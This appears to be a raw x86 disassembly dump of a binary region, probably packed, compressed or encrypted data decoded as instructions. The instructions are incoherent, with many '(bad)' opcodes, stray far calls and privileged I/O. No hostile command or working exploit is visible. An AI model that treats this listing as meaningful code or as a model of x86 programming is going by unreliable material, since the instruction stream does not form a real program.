  426b14:	dec    esp
  426b15:	out    dx,al
  426b16:	cwde   
  426b17:	mov    bl,bl
  426b19:	pusha  
  426b1a:	into   
  426b1b:	ror    BYTE PTR [esi+0x7b047f82],1
  426b21:	cs inc ebp
  426b23:	jnp    0x426b06
  426b25:	je     0x426adf
  426b27:	jne    0x426b18
  426b29:	test   dl,0xef
  426b2c:	push   es
  426b2d:	aaa    
  426b2e:	scas   eax,DWORD PTR es:[edi]
  426b2f:	mov    al,0x9b
  426b31:	repz ss into 
  426b34:	retf   
  426b35:	push   ebx
  426b36:	mov    DWORD PTR [ebx],0xd5ffda9e
  426b3c:	fstp   TBYTE PTR [esi+0x7ba9c7b6]
  426b42:	adc    DWORD PTR [ebx-0x75],0xe82e023d
  426b49:	call   0x6917:0xb3e9cc37
  426b50:	in     al,0xaa
  426b52:	xchg   esi,eax
  426b53:	sub    DWORD PTR [edx+0x48],esp
  426b56:	inc    edi
  426b57:	xor    DWORD PTR [edx+0x33],ebx
  426b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b5b:	loop   0x426bbd
  426b5d:	adc    bh,BYTE PTR [edx]
  426b5f:	dec    eax
  426b60:	inc    esi
  426b61:	mov    cl,0xca
  426b63:	inc    ebp
  426b64:	cmp    BYTE PTR [edx+0x35],ah
  426b67:	icebp  
  426b68:	gs lahf 
  426b6a:	inc    ecx
  426b6b:	aaa    
  426b6c:	mov    dh,0xd4
  426b6e:	xchg   edx,eax
  426b6f:	cmp    esp,eax
  426b71:	js     0x426b21
  426b73:	mov    eax,ds:0xbefb1d6f
  426b78:	mov    edx,0xbea5b31a
  426b7d:	rep stos BYTE PTR es:[edi],al
  426b7f:	jns    0x426be2
  426b81:	and    bl,bl
  426b83:	sub    eax,0xb10b072f
  426b88:	mov    es,eax
  426b8a:	rol    DWORD PTR [ebx+ecx*8],0x29
  426b8e:	add    ecx,DWORD PTR [eax+0x894e57d]
  426b94:	mov    edx,?
  426b96:	rcr    BYTE PTR [ecx+ebx*4+0x379f729c],1
  426b9d:	es pusha 
  426b9f:	or     ch,dl
  426ba1:	imul   esp,DWORD PTR [eax-0x7f],0xa80ea6c3
  426ba8:	cmc    
  426ba9:	int3   
  426baa:	rol    esp,1
  426bac:	inc    esi
  426bad:	cmp    eax,0x53a2db8f
  426bb2:	xor    ah,BYTE PTR [ecx]
  426bb4:	xchg   ecx,eax
	...
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	sub    edx,ecx
  426c24:	fdivr  DWORD PTR [edi+0x6c]
  426c27:	popf   
  426c28:	add    DWORD PTR [eax],eax
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [esi-0x335271c9],bl
  426c33:	mov    dh,0x69
  426c35:	shr    BYTE PTR [edx+0x3c],cl
  426c38:	(bad)  
  426c39:	int    0x79
  426c3b:	in     al,dx
  426c3c:	adc    ebx,ecx
  426c3e:	push   eax
  426c3f:	cs ret 
  426c41:	out    dx,eax
  426c42:	scas   eax,DWORD PTR es:[edi]
  426c43:	or     ax,sp
  426c46:	mov    bl,dl
  426c48:	mov    al,dh
  426c4a:	icebp  
  426c4b:	cmp    edx,DWORD PTR [ebp+0x14]
  426c4e:	jmp    0x426bdd
  426c50:	jl     0x426be2
  426c52:	ds popa 
  426c54:	push   cs
  426c55:	imul   esp,DWORD PTR [eax],0x587585
  426c5b:	cdq    
  426c5c:	outs   dx,BYTE PTR ds:[esi]
  426c5d:	data16 or bh,cl
  426c60:	jne    0x426bf7
  426c62:	mov    bh,0x44
  426c64:	cdq    
  426c65:	xlat   BYTE PTR ds:[ebx]
  426c66:	(bad)  
  426c67:	sub    eax,0xc994811b
  426c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c6d:	xchg   BYTE PTR [eax+0x36],ch
  426c70:	imul   ecx,DWORD PTR [eax+0x24],0x566ed157
  426c77:	mov    edi,0x33a8e282
  426c7c:	or     eax,DWORD PTR ds:0x21ddd0dd
  426c82:	dec    eax
  426c83:	test   al,0xd3
  426c85:	mov    bl,0xe3
  426c87:	imul   esi,esp,0x34
  426c8a:	and    esp,esi
  426c8c:	push   ss
  426c8d:	jae    0x426cfc
  426c8f:	push   es
  426c90:	mov    cl,0xb3
  426c92:	sar    BYTE PTR [eax+0x4b810d23],cl
  426c98:	imul   esi,DWORD PTR [eax+0x3a],0x4a601c8
  426c9f:	cdq    
  426ca0:	add    dl,BYTE PTR [esi]
  426ca2:	pop    edx
  426ca3:	mov    ds,WORD PTR [eax-0x5]
  426ca6:	xor    edi,ebx
  426ca8:	lods   eax,DWORD PTR ds:[esi]
  426ca9:	mov    ebp,0xd7d4920a
  426cae:	and    dl,BYTE PTR [esi]
  426cb0:	cwde   
  426cb1:	sbb    eax,0xbc01e015
  426cb6:	xchg   edi,eax
  426cb7:	in     al,0xfd
  426cb9:	pop    edi
  426cba:	sbb    cl,BYTE PTR [eax*2-0x441751b6]
  426cc1:	xchg   ecx,eax
  426cc2:	xchg   ecx,eax
  426cc3:	fstp   DWORD PTR [ecx]
  426cc5:	outs   dx,BYTE PTR ds:[esi]
  426cc6:	pop    ds
  426cc7:	int3   
  426cc8:	stos   BYTE PTR es:[edi],al
  426cc9:	popa   
  426cca:	pushf  
  426ccb:	fmul   QWORD PTR [ebx]
  426ccd:	cmp    DWORD PTR ss:[edi],edi
  426cd0:	in     al,dx
  426cd1:	push   ss
  426cd2:	imul   eax,ecx,0xfbccf487
  426cd8:	xchg   ecx,eax
  426cd9:	and    al,0xa6
  426cdb:	mov    esi,0x93e54f2a
  426ce0:	mov    DWORD PTR [ebx-0x1ee00037],edx
  426ce6:	xchg   esi,eax
  426ce7:	stos   DWORD PTR es:[edi],eax
  426ce8:	stos   BYTE PTR es:[edi],al
  426ce9:	scas   al,BYTE PTR es:[edi]
  426cea:	pop    eax
  426ceb:	cs inc esi
  426ced:	cmp    BYTE PTR [eax+eax*1-0x512793be],0x3a
  426cf5:	scas   eax,DWORD PTR es:[edi]
  426cf6:	sahf   
  426cf7:	mov    ebp,0x2aec42dd
  426cfc:	push   eax
  426cfd:	or     DWORD PTR [eax-0x8],ebp
  426d00:	stos   BYTE PTR es:[edi],al
  426d01:	into   
  426d02:	xor    BYTE PTR [eax+0x4cd7432b],0x2b
  426d09:	retf   
  426d0a:	wrmsr  
  426d0c:	pop    es
  426d0d:	inc    esp
  426d0e:	aam    0xd3
  426d10:	shl    BYTE PTR [ecx-0x672519d2],1
  426d16:	bound  ecx,QWORD PTR [edx+0x1ddbef2a]
  426d1c:	cs dec ebx
  426d1e:	mov    ds,WORD PTR [ecx+esi*4]
  426d21:	inc    ebx
  426d22:	sbb    ecx,edx
  426d24:	fistp  QWORD PTR [edi]
  426d26:	push   ebx
  426d27:	mov    cl,BYTE PTR [edi-0xc41b044]
  426d2d:	ds test al,0x49
  426d30:	inc    ebx
  426d31:	or     esi,ebx
  426d33:	stos   BYTE PTR es:[edi],al
  426d34:	add    eax,0x0
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0x1b87:0x7e1b1bf9
  426da3:	and    DWORD PTR [esi+ecx*2+0x73],0x700019e
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [ebx+ecx*2+0x288f76c5],al
  426db4:	outs   dx,DWORD PTR ds:[esi]
  426db5:	dec    edi
  426db6:	sbb    esp,ecx
  426db8:	call   0x2bc5e79d
  426dbd:	pop    es
  426dbe:	in     al,dx
  426dbf:	iret   
  426dc0:	popa   
  426dc1:	repz rcr BYTE PTR [ecx-0xa614686],0x6e
  426dc9:	sbb    BYTE PTR ds:0xa00d01c9,al
  426dcf:	js     0x426e01
  426dd1:	popf   
  426dd2:	pop    esi
  426dd3:	push   ebp
  426dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426dd5:	mov    bh,ah
  426dd7:	xor    edi,DWORD PTR [edi+0x52fb2845]
  426ddd:	aaa    
  426dde:	push   cs
  426ddf:	scas   eax,DWORD PTR es:[edi]
  426de0:	mov    esp,0x358c491b
  426de5:	jle    0x426e1b
  426de7:	and    dh,bh
  426de9:	xor    al,0xbf
  426deb:	retf   0x61c5
  426dee:	shl    DWORD PTR [ecx],1
  426df0:	je     0x426e50
  426df2:	and    eax,0xfadcf09
  426df7:	mov    edi,0x80f01f7a
  426dfc:	mov    ch,0xab
  426dfe:	jecxz  0x426d81
  426e00:	mov    ebp,0xf18a8ec9
  426e05:	call   0xab35de28
  426e0a:	xor    esp,0x88983d44
  426e10:	in     al,0xa9
  426e12:	dec    ebp
  426e13:	xor    eax,DWORD PTR [eax-0x52]
  426e16:	and    eax,0x7a2053f2
  426e1b:	or     DWORD PTR [eax+0x72],ebx
  426e1e:	mov    ebp,0x8368a877
  426e23:	sub    DWORD PTR [esi+eax*1-0x42],0x29
  426e28:	xchg   esp,eax
  426e29:	js     0x426e3c
  426e2b:	mov    ds:0xc86de21d,al
  426e30:	stos   DWORD PTR es:[edi],eax
  426e31:	xchg   edx,eax
  426e32:	xlat   BYTE PTR ds:[ebx]
  426e33:	mov    bh,0x77
  426e35:	ds in  al,dx
  426e37:	cs loopne 0x426e32
  426e3a:	jns    0x426e3f
  426e3c:	jmp    0x22c1:0xe6169ede
  426e43:	scas   eax,DWORD PTR es:[edi]
  426e44:	es xchg esi,eax
  426e46:	stos   DWORD PTR es:[edi],eax
  426e47:	(bad)  
  426e48:	lock mov bl,0x91
  426e4b:	(bad)  
  426e4c:	push   edx
  426e4d:	adc    BYTE PTR [ecx+0x3d6acff9],dl
  426e53:	(bad)  
  426e54:	sbb    al,0xca
  426e56:	mov    edx,edi
  426e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e59:	cld    
  426e5a:	mov    BYTE PTR [edi+0x11],cl
  426e5d:	mov    ch,0x3
  426e5f:	fldenv [edi+0x8]
  426e62:	and    eax,0x29940e85
  426e67:	xchg   esp,eax
  426e68:	outs   dx,BYTE PTR ds:[esi]
  426e69:	or     cl,BYTE PTR [esi+edi*4+0x6c68e1cf]
  426e70:	aaa    
  426e71:	fcmovnbe st,st(1)
  426e73:	idiv   BYTE PTR [edi+0x70bb2c6]
  426e79:	jle    0x426ea1
  426e7b:	xchg   ebp,eax
  426e7c:	retf   
  426e7d:	outs   dx,DWORD PTR ds:[esi]
  426e7e:	cmp    DWORD PTR [edi+0x43],edx
  426e81:	xchg   ecx,eax
  426e82:	inc    ebx
  426e83:	cmp    DWORD PTR [edx],esp
  426e85:	retf   
  426e86:	fnsave [ebp-0x1f880731]
  426e8c:	ficom  WORD PTR [ebx+eax*4-0x59]
  426e90:	mov    ecx,0x78f95535
  426e95:	xchg   edx,eax
  426e96:	(bad)  
  426e97:	fbstp  TBYTE PTR [edi+0x36d6e19e]
  426e9d:	xor    al,BYTE PTR [edi-0x3c3fc9a6]
  426ea3:	nop
  426ea4:	(bad)  
  426ea5:	stos   DWORD PTR es:[edi],eax
  426ea6:	fcmovnb st,st(3)
  426ea8:	adc    BYTE PTR [ebx-0x74],ch
  426eab:	push   ecx
  426eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ead:	fistp  DWORD PTR [ecx-0x5011cf30]
  426eb3:	in     al,dx
  426eb4:	in     eax,0x0
	...
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0x127e15c],ch
  426f25:	jb     0x426fa1
  426f27:	lahf   
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [edi-0x57a8739f],ch
  426f33:	add    al,0x88
  426f35:	lea    eax,[edi]
  426f37:	dec    ebx
  426f38:	ror    BYTE PTR [edi],0x30
  426f3b:	cwde   
  426f3c:	sub    esp,DWORD PTR [edx+0x50]
  426f3f:	ds test al,0x8b
  426f42:	inc    esi
  426f43:	cmp    BYTE PTR [ebx+0x55],0xcf
  426f47:	sbb    DWORD PTR [edx+0x35],ebx
  426f4a:	addr16 pop esp
  426f4c:	ins    BYTE PTR es:[edi],dx
  426f4d:	pop    es
  426f4e:	mov    eax,0x8bc4242a
  426f53:	xor    al,0x62
  426f55:	enter  0xaa8c,0x4e
  426f59:	dec    edi
  426f5a:	fsub   DWORD PTR [ecx+ecx*2+0x52]
  426f5e:	int3   
  426f5f:	aaa    
  426f60:	and    al,0x33
  426f62:	bound  esp,QWORD PTR [edx-0xf]
  426f65:	add    BYTE PTR [ebx],0x6a
  426f68:	in     al,dx
  426f69:	ss out dx,eax
  426f6b:	cld    
  426f6c:	xor    ebx,esp
  426f6e:	pop    eax
  426f6f:	jge    0x426f49
  426f71:	sbb    al,0x5a
  426f73:	adc    eax,esi
  426f75:	cli    
  426f76:	fist   WORD PTR [ebx+0x606c952d]
  426f7c:	(bad)  
  426f7d:	pop    edi
  426f7e:	sub    al,BYTE PTR [ebx*4+0x764dbea9]
  426f85:	lock ror BYTE PTR [eax+0x74448930],1
  426f8c:	mov    ebp,eax
  426f8e:	push   esp
  426f8f:	sbb    BYTE PTR [edx+0x14],dh
  426f92:	ja     0x426f8a
  426f94:	mov    esi,0xa5d24e44
  426f99:	(bad)  
  426f9a:	out    dx,eax
  426f9b:	jmp    0xa2f6:0x8b3b20c1
  426fa2:	inc    ebp
  426fa3:	or     BYTE PTR [edi-0x19ee106c],dh
  426fa9:	repz mov dl,al
  426fac:	inc    esp
  426fad:	sar    DWORD PTR [ebp+0xcfd3e3f],1
  426fb3:	push   edx
  426fb4:	push   ds
  426fb5:	js     0x426f74
  426fb7:	stos   BYTE PTR es:[edi],al
  426fb8:	mov    al,0xfc
  426fba:	sub    eax,0xfef1c046
  426fbf:	pop    edx
  426fc0:	xchg   ebp,eax
  426fc1:	adc    ebp,esp
  426fc3:	ror    BYTE PTR [ebp-0x31aebaeb],1
  426fc9:	cmc    
  426fca:	repnz adc al,0x2d
  426fcd:	int3   
  426fce:	mov    ah,0x72
  426fd0:	push   eax
  426fd1:	(bad)  
  426fd2:	fistp  WORD PTR [edx]
  426fd4:	scas   al,BYTE PTR es:[edi]
  426fd5:	push   ecx
  426fd6:	lods   eax,DWORD PTR ds:[esi]
  426fd7:	xor    eax,0x97c1140e
  426fdc:	mov    bh,0xde
  426fde:	(bad)  
  426fdf:	pop    ecx
  426fe0:	(bad)  
  426fe1:	into   
  426fe2:	jbe    0x42700c
  426fe4:	push   esp
  426fe5:	aas    
  426fe6:	stos   BYTE PTR es:[edi],al
  426fe7:	adc    cl,0x24
  426fea:	push   edi
  426feb:	mov    ebx,0xb1c06ead
  426ff0:	jo     0x427062
  426ff2:	(bad)  
  426ff3:	ror    BYTE PTR [eax+0x50b1cc3e],0xc6
  426ffa:	fild   WORD PTR [ecx+0x26af163b]
  427000:	retf   
  427001:	ja     0x426fdd
  427003:	lods   al,BYTE PTR ds:[esi]
  427004:	(bad)  
  427005:	out    dx,eax
  427006:	cs cmp al,0x77
  427009:	and    eax,0x3d40a5f4
  42700e:	cmp    eax,0x9715bcb0
  427013:	imul   edi,DWORD PTR [esi-0x56],0xf41e8101
  42701a:	hlt    
  42701b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42701c:	push   ecx
  42701d:	pusha  
  42701e:	cmp    al,dh
  427020:	and    ah,BYTE PTR ds:0x21ef964
  427026:	lods   al,BYTE PTR ds:[esi]
  427027:	add    BYTE PTR [eax+0x4dde55ca],0x19
  42702e:	xlat   BYTE PTR ds:[ebx]
  42702f:	(bad)  gs:[ecx+0x2750c0]
	...
  427096:	or     al,0x6d
  427098:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x3f37b1c6],eax
  4270a5:	repnz and DWORD PTR [eax+0x1070001],0xee620000
  4270b0:	dec    edi
  4270b1:	mov    bh,0xa5
  4270b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270b4:	lods   al,BYTE PTR ds:[esi]
  4270b5:	add    ecx,eax
  4270b7:	leave  
  4270b8:	cmc    
  4270b9:	adc    dl,BYTE PTR [ebx+eax*2]
  4270bc:	out    0xb4,eax
  4270be:	pop    edi
  4270bf:	dec    ecx
  4270c0:	adc    edi,DWORD PTR [ebx-0x62]
  4270c3:	adc    eax,0xa1f9e98b
  4270c8:	inc    esp
  4270c9:	xor    DWORD PTR [ebx-0x46],ecx
  4270cc:	lea    esi,[edi+0x2a7625ff]
  4270d2:	popf   
  4270d3:	pop    esp
  4270d4:	mov    eax,0x52a6ef7
  4270d9:	sbb    DWORD PTR [esi-0x69e9eaf2],eax
  4270df:	ja     0x427136
  4270e1:	enter  0xe5b6,0x7a
  4270e5:	inc    edi
  4270e6:	into   
  4270e7:	sar    BYTE PTR [eax],cl
  4270e9:	cdq    
  4270ea:	jo     0x42708e
  4270ec:	push   ecx
  4270ed:	imul   edx,DWORD PTR [ebx-0x39],0x463be119
  4270f4:	inc    ecx
  4270f5:	stos   DWORD PTR es:[edi],eax
  4270f6:	inc    edx
  4270f7:	call   DWORD PTR [ecx+0x20844b6b]
  4270fd:	jmp    0x5ba78073
  427102:	out    dx,al
  427103:	push   esi
  427104:	imul   eax,ecx,0x43
  427107:	imul   eax,esp,0x3e
  42710a:	stos   BYTE PTR es:[edi],al
  42710b:	sbb    DWORD PTR [esi+esi*8],ecx
  42710e:	cs jmp 0x4270fa
  427111:	dec    ebp
  427112:	cwde   
  427113:	shl    DWORD PTR [esi+0x2fdd1b5f],cl
  427119:	loopne 0x4270d7
  42711b:	xor    edx,DWORD PTR [ebp-0x51]
  42711e:	sub    BYTE PTR [edi],cl
  427120:	inc    eax
  427121:	ja     0x4270ba
  427123:	mov    esi,DWORD PTR [edx-0x4b]
  427126:	xor    BYTE PTR [esi+0x12b97c14],ch
  42712c:	mov    DWORD PTR [eiz*8-0x236a280a],ebx
  427133:	not    ecx
  427135:	lods   al,BYTE PTR ds:[esi]
  427136:	test   BYTE PTR [edx+0x39a93862],bh
  42713c:	sub    edi,DWORD PTR [eax+eax*8-0x7778c22a]
  427143:	fsubr  QWORD PTR [edx+ecx*2-0x37]
  427147:	jge    0x42712a
  427149:	call   0xd35d:0x279b7e50
  427150:	and    al,0xe8
  427152:	jno    0x42711b
  427154:	outs   dx,DWORD PTR ds:[esi]
  427155:	and    cl,bl
  427157:	add    BYTE PTR [esi-0x79],0x2f
  42715b:	jl     0x427157
  42715d:	jp     0x42719a
  42715f:	fisttp WORD PTR [ebx+0x7e]
  427162:	jns    0x42716c
  427164:	int    0x3c
  427166:	les    edi,FWORD PTR [ebp+0x78]
  427169:	jns    0x42714c
  42716b:	hlt    
  42716c:	popf   
  42716d:	int3   
  42716e:	sub    cl,BYTE PTR [ebp+0x1e]
  427171:	repnz imul BYTE PTR [eax+0x1a]
  427175:	gs scas eax,DWORD PTR es:[edi]
  427177:	imul   ebp,DWORD PTR ds:0x5368188e,0x5a300213
  427181:	gs push ds
  427183:	or     al,0xcc
  427185:	cld    
  427186:	sbb    ecx,DWORD PTR [edx]
  427188:	pop    ebx
  427189:	pop    ss
  42718a:	ret    
  42718b:	ret    
  42718c:	mov    bh,0xbc
  42718e:	pop    edx
  42718f:	mov    ecx,0xe8a00370
  427194:	shl    DWORD PTR [esi+edx*4+0x5e6bf2b6],1
  42719b:	inc    edx
  42719c:	retf   0x9914
  42719f:	popf   
  4271a0:	pop    ds
  4271a1:	push   0xbd6dc759
  4271a6:	popf   
  4271a7:	stos   DWORD PTR es:[edi],eax
  4271a8:	xor    eax,0xcfea4f2c
  4271ad:	jmp    0x33d41e26
  4271b2:	mov    ah,0x48
  4271b4:	inc    DWORD PTR [eax]
	...
  427216:	push   ds
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x18630100
  427224:	adc    DWORD PTR [edx+0x1a188],esp
  42722a:	pop    es
  42722b:	add    DWORD PTR [eax],eax
  42722d:	add    BYTE PTR [eax],al
  42722f:	pop    ecx
  427230:	stos   BYTE PTR es:[edi],al
  427231:	jle    0x427224
  427233:	sbb    dh,BYTE PTR [ebx]
  427235:	mov    al,BYTE PTR ss:[ecx]
  427238:	mov    dh,0x64
  42723a:	sbb    BYTE PTR [ebx+0x7f822580],0xbb
  427241:	(bad)  
  427242:	les    edx,FWORD PTR [esi-0x785e1692]
  427248:	pop    eax
  427249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42724a:	adc    eax,0xaa8c7774
  42724f:	test   eax,0xbc890eec
  427254:	fild   QWORD PTR [ecx+0x38144ac1]
  42725a:	dec    edi
  42725b:	push   edx
  42725c:	shr    BYTE PTR [ebx-0x3b],1
  42725f:	out    dx,eax
  427260:	call   0xf08b:0xd4597bb6
  427267:	sbb    al,0x59
  427269:	xor    DWORD PTR [ecx-0x63d8483a],edx
  42726f:	adc    ch,ah
  427271:	in     eax,dx
  427272:	out    0xd2,al
  427274:	xchg   DWORD PTR [edx+0x4e],ebx
  427277:	bound  ebx,QWORD PTR [eax+0x52]
  42727a:	ret    0x6282
  42727d:	ds test ch,al
  427280:	push   es
  427281:	fistp  WORD PTR [ebp+0x2f71beff]
  427287:	mov    esp,0x14edd73c
  42728c:	sahf   
  42728d:	push   ecx
  42728e:	inc    esp
  42728f:	(bad)  
  427290:	popa   
  427291:	into   
  427292:	xchg   edi,eax
  427293:	shl    BYTE PTR [ebp-0x32],0xbd
  427297:	push   ebx
  427298:	sti    
  427299:	ins    DWORD PTR es:[edi],dx
  42729a:	mov    ds:0xe82b2e07,eax
  42729f:	sub    eax,0xc5151136
  4272a4:	or     DWORD PTR [edi+0x10],0xffffffa8
  4272a8:	sub    al,0xd5
  4272aa:	nop
  4272ab:	pop    esp
  4272ac:	jnp    0x42731f
  4272ae:	or     al,0xc0
  4272b0:	popa   
  4272b1:	jmp    0x959e:0xe2c977b3
  4272b8:	out    0xbc,al
  4272ba:	repz add DWORD PTR [ebx+0x3c],eax
  4272be:	gs push es
  4272c0:	xchg   ecx,eax
  4272c1:	inc    edx
  4272c2:	test   al,0xf6
  4272c4:	and    ebp,DWORD PTR [ebp-0x75]
  4272c7:	les    esp,FWORD PTR [ebx+0x31101191]
  4272cd:	into   
  4272ce:	and    BYTE PTR [ebx],ch
  4272d0:	jle    0x427283
  4272d2:	cdq    
  4272d3:	and    ebp,DWORD PTR [eax+ebp*4]
  4272d6:	add    ch,bl
  4272d8:	adc    ecx,DWORD PTR [ecx]
  4272da:	lods   eax,DWORD PTR ds:[esi]
  4272db:	pop    ebp
  4272dc:	ret    0x2e9d
  4272df:	imul   eax,DWORD PTR [eax],0x598f9238
  4272e5:	icebp  
  4272e6:	pop    esi
  4272e7:	dec    esp
  4272e8:	je     0x4272ba
  4272ea:	jge    0x42730c
  4272ec:	rol    BYTE PTR [ecx-0x2d576bad],1
  4272f2:	add    eax,0x847aa281
  4272f7:	sbb    dl,BYTE PTR [ecx+0x43550df6]
  4272fd:	sbb    ebx,ecx
  4272ff:	leave  
  427300:	test   DWORD PTR [ebp+0x3e798add],edx
  427306:	rol    BYTE PTR [edx-0x3fb7cd91],0xbb
  42730d:	arpl   WORD PTR [edx-0x5a3f9083],si
  427313:	ds fs jge 0x427368
  427317:	xor    eax,0xc4d4223
  42731c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42731d:	xchg   esp,eax
  42731e:	mov    edx,0xb85f5b12
  427323:	cmp    bh,BYTE PTR [ebx]
  427325:	(bad)  
  427326:	mov    eax,0x90ae1c8e
  42732b:	mov    esp,0x47407551
  427330:	nop
  427331:	pop    ss
  427332:	and    dh,BYTE PTR [esi+ecx*2+0x0]
	...
  427396:	adc    bl,BYTE PTR ds:0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	push   ss
  4273a3:	mov    al,0x3
  4273a5:	mov    cs,WORD PTR [edi+0x70001a2]
  4273ab:	add    DWORD PTR [eax],eax
  4273ad:	add    cl,cl
  4273af:	lods   eax,DWORD PTR ds:[esi]
  4273b0:	cmp    esi,DWORD PTR [edi]
  4273b2:	and    ah,BYTE PTR [eax+ebx*8-0x1bcbe886]
  4273b9:	or     dh,ch
  4273bb:	pushf  
  4273bc:	div    BYTE PTR [eax-0x68]
  4273bf:	(bad)  
  4273c0:	int    0x16
  4273c2:	cmp    dh,BYTE PTR [eax]
  4273c4:	cmc    
  4273c5:	pop    ebx
  4273c6:	les    esp,FWORD PTR [ecx+esi*8+0x5b0d6ee8]
  4273cd:	loopne 0x4273a3
  4273cf:	adc    ah,BYTE PTR [ecx+edx*1]
  4273d2:	fadd   QWORD PTR [edi+0x1d]
  4273d5:	cmc    
  4273d6:	fcmove st,st(7)
  4273d8:	adc    eax,edi
  4273da:	mov    ds:0x7be33200,eax
  4273df:	ret    0xb5f2
  4273e2:	jbe    0x427450
  4273e4:	xchg   edx,eax
  4273e5:	dec    eax
  4273e6:	add    DWORD PTR [ebp-0x263ea4e7],0xe579be1a
  4273f0:	mov    DWORD PTR [ecx-0x51],ebx
  4273f3:	icebp  
  4273f4:	fnsave [esp+edi*4]
  4273f7:	arpl   WORD PTR [edx],sp
  4273f9:	or     dh,ah
  4273fb:	or     eax,0xa0f980d2
  427400:	loop   0x427460
  427402:	pop    edx
  427403:	jne    0x42743e
  427405:	jp     0x42746c
  427407:	in     eax,dx
  427408:	sahf   
  427409:	mov    ds:0xa1d45336,eax
  42740e:	sbb    BYTE PTR [ebx+0x208bd964],ah
  427414:	adc    BYTE PTR [edx],dl
  427416:	cld    
  427417:	enter  0x8bd6,0xc0
  42741b:	stos   BYTE PTR es:[edi],al
  42741c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42741d:	xor    DWORD PTR [ebp-0x61b61ec3],ebx
  427423:	push   ebp
  427425:	les    esp,FWORD PTR [eax-0x6e]
  427428:	cmp    ebx,edi
  42742a:	das    
  42742b:	sbb    ebx,edx
  42742d:	adc    bl,BYTE PTR [eax-0x41]
  427430:	js     0x4273db
  427432:	xor    DWORD PTR [edi+0x0],esi
  427435:	push   0xffffffe1
  427437:	xchg   ecx,eax
  427438:	jecxz  0x42746a
  42743a:	jne    0x42743d
  42743c:	jmp    0x427494
  42743e:	push   edx
  42743f:	lods   al,BYTE PTR ds:[esi]
  427440:	in     al,dx
  427441:	and    eax,0x22762b7a
  427446:	xlat   BYTE PTR ds:[ebx]
  427447:	xchg   ebp,eax
  427448:	adc    ebp,esi
  42744a:	sbb    cl,BYTE PTR [eax]
  42744c:	sub    eax,0x4d738c45
  427451:	or     cl,BYTE PTR [ebx-0x7054b2b8]
  427457:	mov    bl,0x59
  427459:	jns    0x427400
  42745b:	push   esp
  42745c:	inc    ecx
  42745d:	scas   al,BYTE PTR es:[edi]
  42745e:	nop
  42745f:	repnz add esi,DWORD PTR [ebp+0x7190e015]
  427466:	and    BYTE PTR [ebx],dh
  427468:	or     eax,0xfb468763
  42746d:	or     eax,ebp
  42746f:	mov    ds,WORD PTR [ecx-0x35]
  427472:	outs   dx,DWORD PTR ds:[esi]
  427473:	push   ds
  427474:	sub    eax,0xc8fe9063
  427479:	mov    dh,0xdd
  42747b:	cli    
  42747c:	and    eax,0x396f7476
  427481:	shr    BYTE PTR [ebx],0x33
  427484:	icebp  
  427485:	(bad)  
  427486:	mov    dl,0xd7
  427488:	es pop ds
  42748a:	imul   DWORD PTR [ecx+esi*4]
  42748d:	call   0x2d03a0f2
  427492:	push   ebp
  427493:	jmp    0x42745b
  427495:	xchg   edx,eax
  427496:	mov    ds:0x47c4339e,al
  42749b:	retf   0xe83d
  42749e:	mov    eax,0xc6744f89
  4274a3:	inc    eax
  4274a4:	xchg   edi,eax
  4274a5:	idiv   DWORD PTR [edx-0x75034bd5]
  4274ab:	jne    0x4274e6
  4274ad:	push   ecx
  4274ae:	in     eax,dx
  4274af:	stos   BYTE PTR es:[edi],al
  4274b0:	retf   0x6d25
  4274b3:	jmp    0x42743c
	...
  427515:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x43a6f50a]
  427523:	adc    eax,0xa396e5f4
  427528:	add    DWORD PTR [eax],eax
  42752a:	pop    es
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [esi+0x56aa26e8],bl
  427533:	and    ah,BYTE PTR [esi+edx*1-0x4003391b]
  42753a:	pusha  
  42753b:	dec    esp
  42753c:	int    0xba
  42753e:	and    dh,BYTE PTR [eax+0x66]
  427541:	sub    eax,0xd99a6fdf
  427546:	add    BYTE PTR [esi-0xde5c076],0xce
  42754d:	add    cl,dh
  42754f:	fwait
  427550:	push   0x39
  427552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427553:	cmc    
  427554:	pop    ecx
  427555:	lods   al,BYTE PTR ds:[esi]
  427556:	rol    BYTE PTR [edi+eiz*1+0x177fd1d1],1
  42755d:	mov    cl,0xe0
  42755f:	dec    edi
  427560:	dec    esp
  427561:	pop    ss
  427562:	loopne 0x427542
  427564:	mov    esp,cs
  427566:	push   eax
  427567:	push   ebx
  427568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427569:	push   ebx
  42756a:	iret   
